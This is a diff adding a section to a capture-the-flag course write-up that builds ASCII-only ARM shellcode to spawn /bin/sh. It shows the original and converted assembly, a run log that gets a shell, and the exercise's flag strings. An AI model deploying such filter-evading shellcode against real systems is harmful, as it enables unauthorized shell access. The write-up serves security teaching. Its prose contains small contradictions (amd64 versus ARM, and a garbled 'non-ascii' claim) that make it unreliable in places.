@@ -164,7 +164,61 @@ CS6332{denUll1phi}
 The problem statement is below.
 
 ```md
+Can you write an amd64 shellcode without using non-ASCII characters
+(i.e., charcodes from 0 upto 127)?
+```
 
+I will modify the code of `1-shellcode-arm` here.
+
+```armasm
+mov     r7, 50
+swi     0
+mov     r1, r0
+mov     r7, 71
+swi     0
+adr     r0, _bin_sh
+mov     r1, 0
+mov     r2, 0
+mov     r7, 11
+swi     0
+_bin_sh:
+    .asciz "/bin/sh"
+```
+
+The first problem is `mov`. Its byte code contains some non-ascii code.
+
+To make it ascii, you can convert it into `eorvc` which does not contain non-ascii. `swi`, which is equivalent to `svc` is equivalent to `svcvc`. It does not use ascii characters.
+
+Since `pc` points to the instruction being fetched, you can convert `adr r0, _bin_sh` into `subvc r0, pc, #0` by reordering the instructions.
+
+Finally, they become like this.
+
+```armasm
+eorvc   r7, r7
+eorvc   r7, 50
+svcvc   1
+eorvc   r1, r1
+eorvc   r1, r0
+eorvc   r7, r7
+eorvc   r7, 71
+svcvc   1
+eorvc   r1, r1
+eorvc   r2, r2
+eorvc   r7, r7
+eorvc   r7, 11
+subvc   r0, pc, #0
+svcvc   1
+binsh:
+    .ascii "//bin/sh"
+```
+
+You've got the flag.
+
+```bash
+TXK220008@ctf-vm3:~/unit2/3-ascii-shellcode-arm $ ./solve3.py ; ./3-ascii-shellcode-arm
+Reading shellcode from shellcode.bin
+$ cat flag
+CS6332{n0T_tH@T_H@Rd}
 ```
 
 ## 4-short-shellcode-arm
